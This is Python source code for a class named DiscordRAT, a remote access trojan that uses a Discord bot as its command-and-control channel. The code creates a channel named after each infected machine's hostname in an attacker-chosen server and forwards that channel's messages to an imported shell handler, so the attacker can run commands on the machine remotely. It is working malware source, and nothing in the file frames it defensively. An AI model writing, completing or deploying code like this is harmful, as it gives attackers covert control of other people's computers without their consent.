from shell.discordShell import DCShell as Shell
from socket import gethostname
from asyncio import TimeoutError
import discord, random

class DiscordRAT(discord.Client):
    def __init__(self, serverID: any, categoryID: any, debugMode: bool=False, *args, **kwargs) -> None:
        self.myName = gethostname()
        self.server = {"id": int(serverID), "category": int(categoryID)}
        self.debug = debugMode
        self.s = Shell()
        self.myChannel = None
        super().__init__(*args, **kwargs)
    
    async def findMyChannel(self) -> int:
        if self.debug: print("[.] Finding in", self.server["id"], "...")
        guild = self.get_guild(self.server["id"])
        category = discord.utils.get(guild.categories, id=self.server["category"])
        channelExists = False
        for ch in guild.channels:
            if ch.name == self.myName:
                channelExists = True
                break
        if channelExists:
            def check(m):
                return (m.author.id == self.user.id and m.content == "checked")
            await ch.send("check")
            try:
                await self.wait_for('message', check=check, timeout=5)
                msg = True
            except TimeoutError:
                msg = False
            if msg:
                ch = await guild.create_text_channel(self.myName+"-"+str(random.random()), category=category)
        else:
            ch = await guild.create_text_channel(self.myName, category=category)
        return ch.id

    async def on_connect(self) -> None:
        if self.debug: print("[.] Bot was connected to discord!")
    
    async def on_ready(self) -> None:
        self.myChannel = await self.findMyChannel()
        if self.debug: print("[.] Bot is ready! ("+self.user.name+")")
    
    async def on_message(self, message) -> None:
        if message.author.id == self.user.id and message.content != "check":
            return
        if message.channel.id == self.myChannel:
            await self.s.process(message)